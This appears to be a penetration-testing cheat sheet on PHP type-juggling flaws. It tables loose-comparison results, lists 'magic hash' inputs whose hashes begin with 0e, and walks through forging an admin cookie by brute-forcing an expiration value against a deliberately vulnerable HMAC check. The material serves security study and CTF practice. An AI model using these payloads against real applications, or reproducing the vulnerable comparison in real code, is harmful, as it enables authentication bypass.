# Type Juggling

> PHP is a loosely typed language, which means it tries to predict the programmer's intent and automatically converts variables to different types whenever it seems necessary. For example, a string containing only numbers can be treated as an integer or a float. However, this automatic conversion (or type juggling) can lead to unexpected results, especially when comparing variables using the '==' operator, which only checks for value equality (loose comparison), not type and value equality (strict comparison).


## Summary

* [Loose Comparison](#loose-comparison)
	* [True Statements](#true-statements)
	* [NULL Statements](#null-statements)
	* [Loose Comparison](#loose-comparison)
* [Magic Hashes](#magic-hashes)
* [Methodology](#methodology)
* [Labs](#labs)
* [References](#references)


## Loose Comparison

> PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.

- **Loose** comparison: using `== or !=` : both variables have "the same value".
- **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".

### True Statements

| Statement                         | Output |
| --------------------------------- |:---------------:|
| `'0010e2'   == '1e3'`             | true |
| `'0xABCdef' == ' 0xABCdef'`       | true (PHP 5.0) / false (PHP 7.0) |
| `'0xABCdef' == '     0xABCdef'`   | true (PHP 5.0) / false (PHP 7.0) |
| `'0x01'     == 1`       		    | true (PHP 5.0) / false (PHP 7.0) |
| `'0x1234Ab' == '1193131'`         | true (PHP 5.0) / false (PHP 7.0) |
| `'123'  == 123`                   | true |
| `'123a' == 123`                   | true |
| `'abc'  == 0`                     | true |
| `'' == 0 == false == NULL`        | true |
| `'' == 0`                         | true |
| `0  == false `                    | true |
| `false == NULL`                   | true |
| `NULL == ''`                      | true |

> PHP8 won't try to cast string into numbers anymore, thanks to the Saner string to number comparisons RFC, meaning that collision with hashes starting with 0e and the likes are finally a thing of the past! The Consistent type errors for internal functions RFC will prevent things like `0 == strcmp($_GET['username'], $password)` bypasses, since strcmp won't return null and spit a warning any longer, but will throw a proper exception instead. 

![LooseTypeComparison](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/Images/table_representing_behavior_of_PHP_with_loose_type_comparisons.png?raw=true)

Loose Type comparisons occurs in many languages:

* [MariaDB](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mariadb)
* [MySQL](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Mysql)
* [NodeJS](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/NodeJS)
* [PHP](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/PHP)
* [Perl](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Perl)
* [Postgres](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Postgres)
* [Python](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/Python)
* [SQLite](https://github.com/Hakumarachi/Loose-Compare-Tables/tree/master/results/SQLite/2.6.0)


### NULL Statements

| Function | Statement                  | Output |
| -------- | -------------------------- |:---------------:|
| sha1     | `var_dump(sha1([]));`      | NULL |
| md5      | `var_dump(md5([]));`       | NULL |


## Magic Hashes

>  Magic hashes arise due to a quirk in PHP's type juggling, when comparing string hashes to integers. If a string hash starts with "0e" followed by only numbers, PHP interprets this as scientific notation and the hash is treated as a float in comparison operations. 

| Hash | "Magic" Number / String    | Magic Hash                                    | Found By / Description      |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| MD4  | gH0nAdHk                   | 0e096229559581069251163783434175              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD4  | IiF+hTai                   | 00e90130237707355082822449868597              | [@spaze](https://github.com/spaze/hashes/blob/master/md4.md) |
| MD5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 129581926211651571912466741651878684928                | 06da5430449f8f6f23dfc1276f722738              | Raw: ?T0D??o#??'or'8.N=? |
| SHA1 | 10932435112                | 0e07766915004133176347055865026311692244      | Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham |
| SHA-224 | 10885164793773          | 0e281250946775200129471613219196999537878926740638594636 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1138075224010833921) |
| SHA-256 | 34250003024812          | 0e46289032038065916139621039085883773413820991920706299695051332 | [@TihanyiNorbert](https://twitter.com/TihanyiNorbert/status/1148586399207178241) |
| SHA-256 | TyNOQHUS                | 0e66298694359207596086558843543959518835691168370379069085300385 | [@Chick3nman512](https://twitter.com/Chick3nman512/status/1150137800324526083)

```php
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
var_dump(md5('aabg7XSs')  == md5('aabC9RqS'));
var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));
?>
```

## Methodology

The vulnerability in the following code lies in the use of a loose comparison (!=) to validate the $cookie['hmac'] against the calculated `$hash`.

```php
function validate_cookie($cookie,$key){
	$hash = hash_hmac('md5', $cookie['username'] . '|' . $cookie['expiration'], $key);
	if($cookie['hmac'] != $hash){ // loose comparison
		return false;
		
	}
	else{
		echo "Well done";
	}
}
```

In this case, if an attacker can control the $cookie['hmac'] value and set it to a string like "0", and somehow manipulate the hash_hmac function to return a hash that starts with "0e" followed only by numbers (which is interpreted as zero), the condition $cookie['hmac'] != $hash would evaluate to false, effectively bypassing the HMAC check.

We have control over 3 elements in the cookie:
- `$username` - username you are targeting, probably "admin"
- `$expiration` - a UNIX timestamp, must be in the future
- `$hmac` - the provided hash, "0"

The exploitation phase is the following:
1. Prepare a malicious cookie: The attacker prepares a cookie with $username set to the user they wish to impersonate (for example, "admin"), `$expiration` set to a future UNIX timestamp, and $hmac set to "0".
2. Brute force the `$expiration` value: The attacker then brute forces different `$expiration` values until the hash_hmac function generates a hash that starts with "0e" and is followed only by numbers. This is a computationally intensive process and might not be feasible depending on the system setup. However, if successful, this step would generate a "zero-like" hash.
	```php
	// docker run -it --rm -v /tmp/test:/usr/src/myapp -w /usr/src/myapp php:8.3.0alpha1-cli-buster php exp.php
	for($i=1424869663; $i < 1835970773; $i++ ){
		$out = hash_hmac('md5', 'admin|'.$i, '');
		if(str_starts_with($out, '0e' )){
			if($out == 0){
				echo "$i - ".$out;
				break;
			}
		}
	}
	?>
	```
3. Update the cookie data with the value from the bruteforce: `1539805986 - 0e772967136366835494939987377058`
	```php
	$cookie = [
		'username' => 'admin',
		'expiration' => 1539805986,
		'hmac' => '0'
	];
	```
4. In this case we assumed the key was a null string : `$key = '';`


## Labs

* [Root Me - PHP - Type Juggling](https://www.root-me.org/en/Challenges/Web-Server/PHP-type-juggling)
* [Root Me - PHP - Loose Comparison](https://www.root-me.org/en/Challenges/Web-Server/PHP-Loose-Comparison)


## References

- [(Super) Magic Hashes - myst404 (@myst404_) - October 7, 2019](https://offsec.almond.consulting/super-magic-hash.html)
- [Magic Hashes - Robert Hansen - May 11, 2015](http://web.archive.org/web/20160722013412/https://www.whitehatsec.com/blog/magic-hashes/)
- [Magic hashes – PHP hash "collisions" - Michal Špaček (@spaze) - May 6, 2015](https://github.com/spaze/hashes)
- [PHP Magic Tricks: Type Juggling - Chris Smith (@chrismsnz) - August 18, 2020](http://web.archive.org/web/20200818131633/https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
- [Writing Exploits For Exotic Bug Classes: PHP Type Juggling - Tyler Borland (TurboBorland) - August 17, 2013](http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html)